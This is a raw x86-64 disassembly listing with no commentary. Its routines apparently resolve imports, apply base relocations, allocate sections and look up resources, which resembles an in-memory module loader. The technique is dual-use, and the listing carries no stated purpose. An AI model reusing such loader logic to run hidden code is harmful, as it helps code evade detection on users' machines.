    69dc16f9:	48 8d 15 50 59 00 00 	lea    0x5950(%rip),%rdx        # 0x69dc7050
    69dc1700:	48 89 f1             	mov    %rsi,%rcx
    69dc1703:	e8 b8 09 00 00       	call   0x69dc20c0
    69dc1708:	48 85 c0             	test   %rax,%rax
    69dc170b:	74 02                	je     0x69dc170f
    69dc170d:	ff d0                	call   *%rax
    69dc170f:	48 89 f1             	mov    %rsi,%rcx
    69dc1712:	e8 39 0d 00 00       	call   0x69dc2450
    69dc1717:	e9 4b ff ff ff       	jmp    0x69dc1667
    69dc171c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc1720:	b8 23 00 00 00       	mov    $0x23,%eax
    69dc1725:	c3                   	ret
    69dc1726:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc172d:	00 00 00 
    69dc1730:	b8 2b 00 00 00       	mov    $0x2b,%eax
    69dc1735:	c3                   	ret
    69dc1736:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc173d:	00 00 00 
    69dc1740:	b8 39 00 00 00       	mov    $0x39,%eax
    69dc1745:	c3                   	ret
    69dc1746:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc174d:	00 00 00 
    69dc1750:	b8 3f 00 00 00       	mov    $0x3f,%eax
    69dc1755:	c3                   	ret
    69dc1756:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc175d:	00 00 00 
    69dc1760:	b8 57 00 00 00       	mov    $0x57,%eax
    69dc1765:	c3                   	ret
    69dc1766:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc176d:	00 00 00 
    69dc1770:	b8 5e 00 00 00       	mov    $0x5e,%eax
    69dc1775:	c3                   	ret
    69dc1776:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc177d:	00 00 00 
    69dc1780:	b8 1d 00 00 00       	mov    $0x1d,%eax
    69dc1785:	c3                   	ret
    69dc1786:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc178d:	00 00 00 
    69dc1790:	b8 1b 00 00 00       	mov    $0x1b,%eax
    69dc1795:	c3                   	ret
    69dc1796:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc179d:	00 00 00 
    69dc17a0:	b8 0e 00 00 00       	mov    $0xe,%eax
    69dc17a5:	c3                   	ret
    69dc17a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc17ad:	00 00 00 
    69dc17b0:	b8 09 00 00 00       	mov    $0x9,%eax
    69dc17b5:	c3                   	ret
    69dc17b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc17bd:	00 00 00 
    69dc17c0:	b8 07 00 00 00       	mov    $0x7,%eax
    69dc17c5:	c3                   	ret
    69dc17c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc17cd:	00 00 00 
    69dc17d0:	b8 4d 00 00 00       	mov    $0x4d,%eax
    69dc17d5:	c3                   	ret
    69dc17d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc17dd:	00 00 00 
    69dc17e0:	b8 4f 00 00 00       	mov    $0x4f,%eax
    69dc17e5:	c3                   	ret
    69dc17e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc17ed:	00 00 00 
    69dc17f0:	b8 60 00 00 00       	mov    $0x60,%eax
    69dc17f5:	c3                   	ret
    69dc17f6:	90                   	nop
    69dc17f7:	90                   	nop
    69dc17f8:	90                   	nop
    69dc17f9:	90                   	nop
    69dc17fa:	90                   	nop
    69dc17fb:	90                   	nop
    69dc17fc:	90                   	nop
    69dc17fd:	90                   	nop
    69dc17fe:	90                   	nop
    69dc17ff:	90                   	nop
    69dc1800:	48 ff 25 bd ab 00 00 	rex.W jmp *0xabbd(%rip)        # 0x69dcc3c4
    69dc1807:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc180e:	00 00 
    69dc1810:	48 ff 25 b5 ab 00 00 	rex.W jmp *0xabb5(%rip)        # 0x69dcc3cc
    69dc1817:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc181e:	00 00 
    69dc1820:	48 ff 25 35 ab 00 00 	rex.W jmp *0xab35(%rip)        # 0x69dcc35c
    69dc1827:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc182e:	00 00 
    69dc1830:	48 ff 25 d5 aa 00 00 	rex.W jmp *0xaad5(%rip)        # 0x69dcc30c
    69dc1837:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc183e:	00 00 
    69dc1840:	48 ff 25 95 aa 00 00 	rex.W jmp *0xaa95(%rip)        # 0x69dcc2dc
    69dc1847:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc184e:	00 00 
    69dc1850:	41 56                	push   %r14
    69dc1852:	41 55                	push   %r13
    69dc1854:	41 54                	push   %r12
    69dc1856:	55                   	push   %rbp
    69dc1857:	57                   	push   %rdi
    69dc1858:	56                   	push   %rsi
    69dc1859:	53                   	push   %rbx
    69dc185a:	48 83 ec 20          	sub    $0x20,%rsp
    69dc185e:	48 8b 01             	mov    (%rcx),%rax
    69dc1861:	8b 90 94 00 00 00    	mov    0x94(%rax),%edx
    69dc1867:	48 89 ce             	mov    %rcx,%rsi
    69dc186a:	85 d2                	test   %edx,%edx
    69dc186c:	0f 84 2a 01 00 00    	je     0x69dc199c
    69dc1872:	48 8b 69 08          	mov    0x8(%rcx),%rbp
    69dc1876:	ba 14 00 00 00       	mov    $0x14,%edx
    69dc187b:	44 8b a0 90 00 00 00 	mov    0x90(%rax),%r12d
    69dc1882:	4c 8b 2d c3 aa 00 00 	mov    0xaac3(%rip),%r13        # 0x69dcc34c
    69dc1889:	49 01 ec             	add    %rbp,%r12
    69dc188c:	4c 89 e1             	mov    %r12,%rcx
    69dc188f:	41 ff d5             	call   *%r13
    69dc1892:	85 c0                	test   %eax,%eax
    69dc1894:	0f 85 02 01 00 00    	jne    0x69dc199c
    69dc189a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc18a0:	41 8b 4c 24 0c       	mov    0xc(%r12),%ecx
    69dc18a5:	85 c9                	test   %ecx,%ecx
    69dc18a7:	0f 84 ef 00 00 00    	je     0x69dc199c
    69dc18ad:	48 01 e9             	add    %rbp,%rcx
    69dc18b0:	48 8b 56 58          	mov    0x58(%rsi),%rdx
    69dc18b4:	ff 56 38             	call   *0x38(%rsi)
    69dc18b7:	48 85 c0             	test   %rax,%rax
    69dc18ba:	48 89 c7             	mov    %rax,%rdi
    69dc18bd:	0f 84 ed 00 00 00    	je     0x69dc19b0
    69dc18c3:	8b 46 18             	mov    0x18(%rsi),%eax
    69dc18c6:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
    69dc18ca:	8d 50 01             	lea    0x1(%rax),%edx
    69dc18cd:	48 63 d2             	movslq %edx,%rdx
    69dc18d0:	48 c1 e2 03          	shl    $0x3,%rdx
    69dc18d4:	e8 6f 34 00 00       	call   0x69dc4d48
    69dc18d9:	48 85 c0             	test   %rax,%rax
    69dc18dc:	0f 84 ea 00 00 00    	je     0x69dc19cc
    69dc18e2:	48 63 56 18          	movslq 0x18(%rsi),%rdx
    69dc18e6:	48 89 46 10          	mov    %rax,0x10(%rsi)
    69dc18ea:	41 8b 1c 24          	mov    (%r12),%ebx
    69dc18ee:	45 8b 74 24 10       	mov    0x10(%r12),%r14d
    69dc18f3:	8d 4a 01             	lea    0x1(%rdx),%ecx
    69dc18f6:	89 4e 18             	mov    %ecx,0x18(%rsi)
    69dc18f9:	48 89 3c d0          	mov    %rdi,(%rax,%rdx,8)
    69dc18fd:	48 89 d8             	mov    %rbx,%rax
    69dc1900:	49 01 ee             	add    %rbp,%r14
    69dc1903:	48 01 eb             	add    %rbp,%rbx
    69dc1906:	85 c0                	test   %eax,%eax
    69dc1908:	49 0f 44 de          	cmove  %r14,%rbx
    69dc190c:	48 8b 13             	mov    (%rbx),%rdx
    69dc190f:	48 85 d2             	test   %rdx,%rdx
    69dc1912:	75 2e                	jne    0x69dc1942
    69dc1914:	eb 6f                	jmp    0x69dc1985
    69dc1916:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc191d:	00 00 00 
    69dc1920:	48 8d 54 15 02       	lea    0x2(%rbp,%rdx,1),%rdx
    69dc1925:	48 89 f9             	mov    %rdi,%rcx
    69dc1928:	ff d0                	call   *%rax
    69dc192a:	48 85 c0             	test   %rax,%rax
    69dc192d:	49 89 06             	mov    %rax,(%r14)
    69dc1930:	74 2d                	je     0x69dc195f
    69dc1932:	48 83 c3 08          	add    $0x8,%rbx
    69dc1936:	48 8b 13             	mov    (%rbx),%rdx
    69dc1939:	49 83 c6 08          	add    $0x8,%r14
    69dc193d:	48 85 d2             	test   %rdx,%rdx
    69dc1940:	74 43                	je     0x69dc1985
    69dc1942:	48 85 d2             	test   %rdx,%rdx
    69dc1945:	48 8b 46 40          	mov    0x40(%rsi),%rax
    69dc1949:	4c 8b 46 58          	mov    0x58(%rsi),%r8
    69dc194d:	79 d1                	jns    0x69dc1920
    69dc194f:	0f b7 d2             	movzwl %dx,%edx
    69dc1952:	48 89 f9             	mov    %rdi,%rcx
    69dc1955:	ff d0                	call   *%rax
    69dc1957:	48 85 c0             	test   %rax,%rax
    69dc195a:	49 89 06             	mov    %rax,(%r14)
    69dc195d:	75 d3                	jne    0x69dc1932
    69dc195f:	48 8b 56 58          	mov    0x58(%rsi),%rdx
    69dc1963:	48 89 f9             	mov    %rdi,%rcx
    69dc1966:	ff 56 48             	call   *0x48(%rsi)
    69dc1969:	b9 7f 00 00 00       	mov    $0x7f,%ecx
    69dc196e:	ff 15 20 aa 00 00    	call   *0xaa20(%rip)        # 0x69dcc394
    69dc1974:	31 c0                	xor    %eax,%eax
    69dc1976:	48 83 c4 20          	add    $0x20,%rsp
    69dc197a:	5b                   	pop    %rbx
    69dc197b:	5e                   	pop    %rsi
    69dc197c:	5f                   	pop    %rdi
    69dc197d:	5d                   	pop    %rbp
    69dc197e:	41 5c                	pop    %r12
    69dc1980:	41 5d                	pop    %r13
    69dc1982:	41 5e                	pop    %r14
    69dc1984:	c3                   	ret
    69dc1985:	49 83 c4 14          	add    $0x14,%r12
    69dc1989:	ba 14 00 00 00       	mov    $0x14,%edx
    69dc198e:	4c 89 e1             	mov    %r12,%rcx
    69dc1991:	41 ff d5             	call   *%r13
    69dc1994:	85 c0                	test   %eax,%eax
    69dc1996:	0f 84 04 ff ff ff    	je     0x69dc18a0
    69dc199c:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc19a1:	48 83 c4 20          	add    $0x20,%rsp
    69dc19a5:	5b                   	pop    %rbx
    69dc19a6:	5e                   	pop    %rsi
    69dc19a7:	5f                   	pop    %rdi
    69dc19a8:	5d                   	pop    %rbp
    69dc19a9:	41 5c                	pop    %r12
    69dc19ab:	41 5d                	pop    %r13
    69dc19ad:	41 5e                	pop    %r14
    69dc19af:	c3                   	ret
    69dc19b0:	b9 7e 00 00 00       	mov    $0x7e,%ecx
    69dc19b5:	ff 15 d9 a9 00 00    	call   *0xa9d9(%rip)        # 0x69dcc394
    69dc19bb:	31 c0                	xor    %eax,%eax
    69dc19bd:	48 83 c4 20          	add    $0x20,%rsp
    69dc19c1:	5b                   	pop    %rbx
    69dc19c2:	5e                   	pop    %rsi
    69dc19c3:	5f                   	pop    %rdi
    69dc19c4:	5d                   	pop    %rbp
    69dc19c5:	41 5c                	pop    %r12
    69dc19c7:	41 5d                	pop    %r13
    69dc19c9:	41 5e                	pop    %r14
    69dc19cb:	c3                   	ret
    69dc19cc:	48 8b 56 58          	mov    0x58(%rsi),%rdx
    69dc19d0:	48 89 f9             	mov    %rdi,%rcx
    69dc19d3:	ff 56 48             	call   *0x48(%rsi)
    69dc19d6:	b9 0e 00 00 00       	mov    $0xe,%ecx
    69dc19db:	ff 15 b3 a9 00 00    	call   *0xa9b3(%rip)        # 0x69dcc394
    69dc19e1:	31 c0                	xor    %eax,%eax
    69dc19e3:	48 83 c4 20          	add    $0x20,%rsp
    69dc19e7:	5b                   	pop    %rbx
    69dc19e8:	5e                   	pop    %rsi
    69dc19e9:	5f                   	pop    %rdi
    69dc19ea:	5d                   	pop    %rbp
    69dc19eb:	41 5c                	pop    %r12
    69dc19ed:	41 5d                	pop    %r13
    69dc19ef:	41 5e                	pop    %r14
    69dc19f1:	c3                   	ret
    69dc19f2:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc19f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc19fd:	00 00 00 
    69dc1a00:	48 8b 12             	mov    (%rdx),%rdx
    69dc1a03:	48 8b 09             	mov    (%rcx),%rcx
    69dc1a06:	e9 2d 33 00 00       	jmp    0x69dc4d38
    69dc1a0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc1a10:	48 8b 12             	mov    (%rdx),%rdx
    69dc1a13:	48 8b 09             	mov    (%rcx),%rcx
    69dc1a16:	e9 1d 33 00 00       	jmp    0x69dc4d38
    69dc1a1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc1a20:	41 57                	push   %r15
    69dc1a22:	b8 48 10 00 00       	mov    $0x1048,%eax
    69dc1a27:	41 56                	push   %r14
    69dc1a29:	41 55                	push   %r13
    69dc1a2b:	41 54                	push   %r12
    69dc1a2d:	55                   	push   %rbp
    69dc1a2e:	57                   	push   %rdi
    69dc1a2f:	56                   	push   %rsi
    69dc1a30:	53                   	push   %rbx
    69dc1a31:	e8 aa 2d 00 00       	call   0x69dc47e0
    69dc1a36:	48 29 c4             	sub    %rax,%rsp
    69dc1a39:	4c 89 c0             	mov    %r8,%rax
    69dc1a3c:	49 89 cc             	mov    %rcx,%r12
    69dc1a3f:	48 89 d7             	mov    %rdx,%rdi
    69dc1a42:	48 8d 72 10          	lea    0x10(%rdx),%rsi
    69dc1a46:	48 c1 e8 10          	shr    $0x10,%rax
    69dc1a4a:	4c 89 c3             	mov    %r8,%rbx
    69dc1a4d:	48 85 c0             	test   %rax,%rax
    69dc1a50:	0f 84 ff 00 00 00    	je     0x69dc1b55
    69dc1a56:	41 80 38 23          	cmpb   $0x23,(%r8)
    69dc1a5a:	0f 84 c0 00 00 00    	je     0x69dc1b20
    69dc1a60:	48 89 d9             	mov    %rbx,%rcx
    69dc1a63:	e8 c8 32 00 00       	call   0x69dc4d30
    69dc1a68:	48 3d 00 08 00 00    	cmp    $0x800,%rax
    69dc1a6e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69dc1a73:	0f 87 3c 01 00 00    	ja     0x69dc1bb5
    69dc1a79:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
    69dc1a7e:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
    69dc1a83:	48 89 da             	mov    %rbx,%rdx
    69dc1a86:	48 89 e9             	mov    %rbp,%rcx
    69dc1a89:	45 31 ed             	xor    %r13d,%r13d
    69dc1a8c:	4d 89 f0             	mov    %r14,%r8
    69dc1a8f:	e8 d4 32 00 00       	call   0x69dc4d68
    69dc1a94:	31 d2                	xor    %edx,%edx
    69dc1a96:	66 42 89 54 75 00    	mov    %dx,0x0(%rbp,%r14,2)
    69dc1a9c:	44 0f b7 77 0c       	movzwl 0xc(%rdi),%r14d
    69dc1aa1:	45 85 f6             	test   %r14d,%r14d
    69dc1aa4:	0f 84 4d 01 00 00    	je     0x69dc1bf7
    69dc1aaa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc1ab0:	47 8d 7c 35 00       	lea    0x0(%r13,%r14,1),%r15d
    69dc1ab5:	48 89 e9             	mov    %rbp,%rcx
    69dc1ab8:	41 d1 ef             	shr    $1,%r15d
    69dc1abb:	44 89 f8             	mov    %r15d,%eax
    69dc1abe:	48 8d 3c c6          	lea    (%rsi,%rax,8),%rdi
    69dc1ac2:	8b 1f                	mov    (%rdi),%ebx
    69dc1ac4:	81 e3 ff ff ff 7f    	and    $0x7fffffff,%ebx
    69dc1aca:	4c 01 e3             	add    %r12,%rbx
    69dc1acd:	48 8d 53 02          	lea    0x2(%rbx),%rdx
    69dc1ad1:	44 0f b7 03          	movzwl (%rbx),%r8d
    69dc1ad5:	ff 15 79 a9 00 00    	call   *0xa979(%rip)        # 0x69dcc454
    69dc1adb:	85 c0                	test   %eax,%eax
    69dc1add:	0f 85 32 01 00 00    	jne    0x69dc1c15
    69dc1ae3:	0f b7 03             	movzwl (%rbx),%eax
    69dc1ae6:	48 3b 44 24 28       	cmp    0x28(%rsp),%rax
    69dc1aeb:	0f 82 ef 00 00 00    	jb     0x69dc1be0
    69dc1af1:	0f 87 20 01 00 00    	ja     0x69dc1c17
    69dc1af7:	48 81 7c 24 28 00 08 	cmpq   $0x800,0x28(%rsp)
    69dc1afe:	00 00 
    69dc1b00:	0f 87 02 01 00 00    	ja     0x69dc1c08
    69dc1b06:	48 89 f8             	mov    %rdi,%rax
    69dc1b09:	48 81 c4 48 10 00 00 	add    $0x1048,%rsp
    69dc1b10:	5b                   	pop    %rbx
    69dc1b11:	5e                   	pop    %rsi
    69dc1b12:	5f                   	pop    %rdi
    69dc1b13:	5d                   	pop    %rbp
    69dc1b14:	41 5c                	pop    %r12
    69dc1b16:	41 5d                	pop    %r13
    69dc1b18:	41 5e                	pop    %r14
    69dc1b1a:	41 5f                	pop    %r15
    69dc1b1c:	c3                   	ret
    69dc1b1d:	0f 1f 00             	nopl   (%rax)
    69dc1b20:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
    69dc1b27:	00 00 
    69dc1b29:	49 8d 48 01          	lea    0x1(%r8),%rcx
    69dc1b2d:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
    69dc1b33:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
    69dc1b38:	e8 e3 31 00 00       	call   0x69dc4d20
    69dc1b3d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
    69dc1b42:	89 c5                	mov    %eax,%ebp
    69dc1b44:	ff 15 a2 a8 00 00    	call   *0xa8a2(%rip)        # 0x69dcc3ec
    69dc1b4a:	85 c0                	test   %eax,%eax
    69dc1b4c:	0f 85 0e ff ff ff    	jne    0x69dc1a60
    69dc1b52:	0f b7 dd             	movzwl %bp,%ebx
    69dc1b55:	44 0f b7 57 0c       	movzwl 0xc(%rdi),%r10d
    69dc1b5a:	41 89 d8             	mov    %ebx,%r8d
    69dc1b5d:	44 0f b7 4f 0e       	movzwl 0xe(%rdi),%r9d
    69dc1b62:	45 01 d1             	add    %r10d,%r9d
    69dc1b65:	45 39 ca             	cmp    %r9d,%r10d
    69dc1b68:	73 25                	jae    0x69dc1b8f
    69dc1b6a:	43 8d 04 11          	lea    (%r9,%r10,1),%eax
    69dc1b6e:	d1 e8                	shr    $1,%eax
    69dc1b70:	41 89 c3             	mov    %eax,%r11d
    69dc1b73:	4a 8d 3c de          	lea    (%rsi,%r11,8),%rdi
    69dc1b77:	66 44 3b 07          	cmp    (%rdi),%r8w
    69dc1b7b:	73 23                	jae    0x69dc1ba0
    69dc1b7d:	41 8d 51 ff          	lea    -0x1(%r9),%edx
    69dc1b81:	44 39 c8             	cmp    %r9d,%eax
    69dc1b84:	0f 44 c2             	cmove  %edx,%eax
    69dc1b87:	41 89 c1             	mov    %eax,%r9d
    69dc1b8a:	45 39 ca             	cmp    %r9d,%r10d
    69dc1b8d:	72 db                	jb     0x69dc1b6a
    69dc1b8f:	31 ff                	xor    %edi,%edi
    69dc1b91:	e9 70 ff ff ff       	jmp    0x69dc1b06
    69dc1b96:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc1b9d:	00 00 00 
    69dc1ba0:	0f 86 60 ff ff ff    	jbe    0x69dc1b06
    69dc1ba6:	41 8d 52 01          	lea    0x1(%r10),%edx
    69dc1baa:	44 39 d0             	cmp    %r10d,%eax
    69dc1bad:	0f 44 c2             	cmove  %edx,%eax
    69dc1bb0:	41 89 c2             	mov    %eax,%r10d
    69dc1bb3:	eb b0                	jmp    0x69dc1b65
    69dc1bb5:	48 8d 4c 00 02       	lea    0x2(%rax,%rax,1),%rcx
    69dc1bba:	e8 b1 31 00 00       	call   0x69dc4d70
    69dc1bbf:	48 85 c0             	test   %rax,%rax
    69dc1bc2:	48 89 c5             	mov    %rax,%rbp
    69dc1bc5:	0f 85 b3 fe ff ff    	jne    0x69dc1a7e
    69dc1bcb:	b9 0e 00 00 00       	mov    $0xe,%ecx
    69dc1bd0:	31 ff                	xor    %edi,%edi
    69dc1bd2:	ff 15 bc a7 00 00    	call   *0xa7bc(%rip)        # 0x69dcc394
    69dc1bd8:	e9 29 ff ff ff       	jmp    0x69dc1b06
    69dc1bdd:	0f 1f 00             	nopl   (%rax)
    69dc1be0:	41 8d 45 01          	lea    0x1(%r13),%eax
    69dc1be4:	45 39 ef             	cmp    %r13d,%r15d
    69dc1be7:	44 0f 44 f8          	cmove  %eax,%r15d
    69dc1beb:	45 89 fd             	mov    %r15d,%r13d
    69dc1bee:	45 39 ee             	cmp    %r13d,%r14d
    69dc1bf1:	0f 87 b9 fe ff ff    	ja     0x69dc1ab0
    69dc1bf7:	31 ff                	xor    %edi,%edi
    69dc1bf9:	48 81 7c 24 28 00 08 	cmpq   $0x800,0x28(%rsp)
    69dc1c00:	00 00 
    69dc1c02:	0f 86 fe fe ff ff    	jbe    0x69dc1b06
    69dc1c08:	48 89 e9             	mov    %rbp,%rcx
    69dc1c0b:	e8 78 31 00 00       	call   0x69dc4d88
    69dc1c10:	e9 f1 fe ff ff       	jmp    0x69dc1b06
    69dc1c15:	79 c9                	jns    0x69dc1be0
    69dc1c17:	41 8d 46 ff          	lea    -0x1(%r14),%eax
    69dc1c1b:	45 39 f7             	cmp    %r14d,%r15d
    69dc1c1e:	45 89 fe             	mov    %r15d,%r14d
    69dc1c21:	44 0f 44 f0          	cmove  %eax,%r14d
    69dc1c25:	eb c7                	jmp    0x69dc1bee
    69dc1c27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc1c2e:	00 00 
    69dc1c30:	57                   	push   %rdi
    69dc1c31:	56                   	push   %rsi
    69dc1c32:	53                   	push   %rbx
    69dc1c33:	8b 81 b4 00 00 00    	mov    0xb4(%rcx),%eax
    69dc1c39:	85 c0                	test   %eax,%eax
    69dc1c3b:	0f 84 87 00 00 00    	je     0x69dc1cc8
    69dc1c41:	8b b1 b0 00 00 00    	mov    0xb0(%rcx),%esi
    69dc1c47:	48 01 d6             	add    %rdx,%rsi
    69dc1c4a:	44 8b 1e             	mov    (%rsi),%r11d
    69dc1c4d:	45 85 db             	test   %r11d,%r11d
    69dc1c50:	74 6d                	je     0x69dc1cbf
    69dc1c52:	8b 7e 04             	mov    0x4(%rsi),%edi
    69dc1c55:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
    69dc1c59:	49 01 d3             	add    %rdx,%r11
    69dc1c5c:	8d 5f f8             	lea    -0x8(%rdi),%ebx
    69dc1c5f:	89 d8                	mov    %ebx,%eax
    69dc1c61:	d1 e8                	shr    $1,%eax
    69dc1c63:	74 4f                	je     0x69dc1cb4
    69dc1c65:	45 31 c9             	xor    %r9d,%r9d
    69dc1c68:	eb 25                	jmp    0x69dc1c8f
    69dc1c6a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc1c70:	66 41 83 fa 0a       	cmp    $0xa,%r10w
    69dc1c75:	75 07                	jne    0x69dc1c7e
    69dc1c77:	0f b7 c0             	movzwl %ax,%eax
    69dc1c7a:	4d 01 04 03          	add    %r8,(%r11,%rax,1)
    69dc1c7e:	89 d8                	mov    %ebx,%eax
    69dc1c80:	41 83 c1 01          	add    $0x1,%r9d
    69dc1c84:	d1 e8                	shr    $1,%eax
    69dc1c86:	48 83 c1 02          	add    $0x2,%rcx
    69dc1c8a:	41 39 c1             	cmp    %eax,%r9d
    69dc1c8d:	73 25                	jae    0x69dc1cb4
    69dc1c8f:	0f b7 01             	movzwl (%rcx),%eax
    69dc1c92:	41 89 c2             	mov    %eax,%r10d
    69dc1c95:	66 25 ff 0f          	and    $0xfff,%ax
    69dc1c99:	66 41 c1 ea 0c       	shr    $0xc,%r10w
    69dc1c9e:	66 41 83 fa 03       	cmp    $0x3,%r10w
    69dc1ca3:	75 cb                	jne    0x69dc1c70
    69dc1ca5:	0f b7 c0             	movzwl %ax,%eax
    69dc1ca8:	45 01 04 03          	add    %r8d,(%r11,%rax,1)
    69dc1cac:	8b 7e 04             	mov    0x4(%rsi),%edi
    69dc1caf:	8d 5f f8             	lea    -0x8(%rdi),%ebx
    69dc1cb2:	eb ca                	jmp    0x69dc1c7e
    69dc1cb4:	48 01 fe             	add    %rdi,%rsi
    69dc1cb7:	44 8b 1e             	mov    (%rsi),%r11d
    69dc1cba:	45 85 db             	test   %r11d,%r11d
    69dc1cbd:	75 93                	jne    0x69dc1c52
    69dc1cbf:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc1cc4:	5b                   	pop    %rbx
    69dc1cc5:	5e                   	pop    %rsi
    69dc1cc6:	5f                   	pop    %rdi
    69dc1cc7:	c3                   	ret
    69dc1cc8:	31 c0                	xor    %eax,%eax
    69dc1cca:	4d 85 c0             	test   %r8,%r8
    69dc1ccd:	0f 94 c0             	sete   %al
    69dc1cd0:	5b                   	pop    %rbx
    69dc1cd1:	5e                   	pop    %rsi
    69dc1cd2:	5f                   	pop    %rdi
    69dc1cd3:	c3                   	ret
    69dc1cd4:	66 90                	xchg   %ax,%ax
    69dc1cd6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc1cdd:	00 00 00 
    69dc1ce0:	41 57                	push   %r15
    69dc1ce2:	41 56                	push   %r14
    69dc1ce4:	41 55                	push   %r13
    69dc1ce6:	41 54                	push   %r12
    69dc1ce8:	55                   	push   %rbp
    69dc1ce9:	57                   	push   %rdi
    69dc1cea:	56                   	push   %rsi
    69dc1ceb:	53                   	push   %rbx
    69dc1cec:	48 83 ec 38          	sub    $0x38,%rsp
    69dc1cf0:	31 f6                	xor    %esi,%esi
    69dc1cf2:	49 8b 01             	mov    (%r9),%rax
    69dc1cf5:	49 8b 79 08          	mov    0x8(%r9),%rdi
    69dc1cf9:	49 89 d4             	mov    %rdx,%r12
    69dc1cfc:	0f b7 50 14          	movzwl 0x14(%rax),%edx
    69dc1d00:	49 89 cd             	mov    %rcx,%r13
    69dc1d03:	4c 89 c5             	mov    %r8,%rbp
    69dc1d06:	4d 89 ce             	mov    %r9,%r14
    69dc1d09:	48 8d 5c 10 18       	lea    0x18(%rax,%rdx,1),%rbx
    69dc1d0e:	0f b7 40 06          	movzwl 0x6(%rax),%eax
    69dc1d12:	66 85 c0             	test   %ax,%ax
    69dc1d15:	74 66                	je     0x69dc1d7d
    69dc1d17:	8b 53 10             	mov    0x10(%rbx),%edx
    69dc1d1a:	85 d2                	test   %edx,%edx
    69dc1d1c:	75 66                	jne    0x69dc1d84
    69dc1d1e:	44 8b 45 00          	mov    0x0(%rbp),%r8d
    69dc1d22:	45 85 c0             	test   %r8d,%r8d
    69dc1d25:	7e 48                	jle    0x69dc1d6f
    69dc1d27:	8b 4b 0c             	mov    0xc(%rbx),%ecx
    69dc1d2a:	4d 63 f8             	movslq %r8d,%r15
    69dc1d2d:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    69dc1d33:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
    69dc1d39:	49 8b 46 58          	mov    0x58(%r14),%rax
    69dc1d3d:	4c 89 fa             	mov    %r15,%rdx
    69dc1d40:	48 01 f9             	add    %rdi,%rcx
    69dc1d43:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    69dc1d48:	41 ff 56 28          	call   *0x28(%r14)
    69dc1d4c:	48 85 c0             	test   %rax,%rax
    69dc1d4f:	0f 84 96 00 00 00    	je     0x69dc1deb
    69dc1d55:	8b 4b 0c             	mov    0xc(%rbx),%ecx
    69dc1d58:	4d 89 f8             	mov    %r15,%r8
    69dc1d5b:	31 d2                	xor    %edx,%edx
    69dc1d5d:	48 01 f9             	add    %rdi,%rcx
    69dc1d60:	89 4b 08             	mov    %ecx,0x8(%rbx)
    69dc1d63:	e8 f0 2f 00 00       	call   0x69dc4d58
    69dc1d68:	49 8b 06             	mov    (%r14),%rax
    69dc1d6b:	0f b7 40 06          	movzwl 0x6(%rax),%eax
    69dc1d6f:	83 c6 01             	add    $0x1,%esi
    69dc1d72:	0f b7 d0             	movzwl %ax,%edx
    69dc1d75:	48 83 c3 28          	add    $0x28,%rbx
    69dc1d79:	39 d6                	cmp    %edx,%esi
    69dc1d7b:	7c 9a                	jl     0x69dc1d17
    69dc1d7d:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc1d82:	eb 69                	jmp    0x69dc1ded
    69dc1d84:	89 d0                	mov    %edx,%eax
    69dc1d86:	03 43 14             	add    0x14(%rbx),%eax
    69dc1d89:	4c 39 e0             	cmp    %r12,%rax
    69dc1d8c:	77 52                	ja     0x69dc1de0
    69dc1d8e:	8b 4b 0c             	mov    0xc(%rbx),%ecx
    69dc1d91:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    69dc1d97:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
    69dc1d9d:	49 8b 46 58          	mov    0x58(%r14),%rax
